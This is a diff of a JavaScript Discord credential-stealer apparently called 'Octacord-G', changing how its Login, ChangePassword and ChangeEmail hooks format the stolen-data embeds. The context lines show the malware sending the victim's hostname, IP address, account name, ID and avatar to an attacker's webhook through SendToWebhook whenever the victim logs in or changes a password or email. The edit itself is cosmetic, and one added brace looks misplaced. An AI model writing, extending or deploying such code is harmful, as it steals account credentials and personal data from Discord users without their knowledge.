@@ -241,8 +241,8 @@ function Login(email, password, token) {
                         username: "Octacord-G",
                         content: "",
                         embeds: [{
-                            "title": "User Login",
-                            "color": 3447704,
+                            "title": "Login Detected",
+                            "color": 16507654,
                             "fields": [{
                                 name: "Info",
                                 value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
@@ -281,27 +281,13 @@ function Login(email, password, token) {
                                 inline: !1
                             }, ],
                             "author": {
-                                "name": "Octacord-G"
-                            },
-                            "footer": {
-                                "text": "Octacord-G"
-                            },
-                            "thumbnail": {
-                                "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-                            }
-                        }, {
-                            "title": `Total Friends (${totalFriends()})`,
-                            "color": 3447704,
-                            "description": CalcFriends(),
-                            "author": {
-                                "name": "Octacord-G"
-                            },
-                            "footer": {
-                                "text": "Octacord-G"
-                            },
-                            "thumbnail": {
-                                "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-                            }
+					"name": `${json.username}.${json.id}`,
+					"icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+				},
+				"footer": {
+					"text": "Octacord-G"
+				}
+                        }
                         }]
                     }
                     SendToWebhook(JSON.stringify(params))
@@ -356,7 +342,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                     content: "",
                     embeds: [{
                         "title": "Password Changed",
-                        "color": 3447704,
+                        "color": 16507654,
                         "fields": [{
                             name: "Info",
                             value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
@@ -460,7 +446,7 @@ function ChangeEmail(newemail, password, token) {
                     content: "",
                     embeds: [{
                         "title": "Email Changed",
-                        "color": 3447704,
+                        "color": 16507654,
                         "fields": [{
                             name: "Info",
                             value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
